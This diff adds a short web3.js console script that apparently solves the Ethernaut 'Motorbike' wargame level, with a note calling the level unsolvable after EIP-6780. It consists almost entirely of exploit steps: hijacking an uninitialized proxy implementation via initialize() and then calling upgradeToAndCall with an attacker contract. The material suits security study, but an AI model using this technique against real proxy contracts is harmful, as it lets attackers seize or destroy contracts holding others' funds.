@@ -1,0 +1,20 @@
+# MOTORBIKE IS UNSOLVABLE DUE TO:
+# EIP-6780: SELFDESTRUCT only in same transaction
+
+
+_IMPLEMENTATION_SLOT = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'
+impSlotData = await web3.eth.getStorageAt(instance,_IMPLEMENTATION_SLOT)
+impAddress = '0x' + impSlotData.slice(-40)
+iniSig = await web3.eth.abi.encodeFunctionSignature('initialize()')
+await web3.eth.sendTransaction({from:player,to:impAddress,data:iniSig})
+
+# confirm player == upgrader
+await web3.eth.getStorageAt(impAddress,0)
+
+# deploy Exploiter contract ('Motorbike.sol' under /contracts)
+exploiter = <deployed Exploiter address>
+exploitData = await web3.eth.abi.encodeFunctionSignature('start()')
+upgradeParams = await web3.eth.abi.encodeParameters(['address','bytes'],[exploiter,exploitData])
+upgradeSig = await web3.eth.abi.encodeFunctionSignature('upgradeToAndCall(address,bytes)')
+txData = upgradeSig + upgradeParams.slice(2,)
+await web3.eth.sendTransaction({from:player,to:impAddress,data:txData})
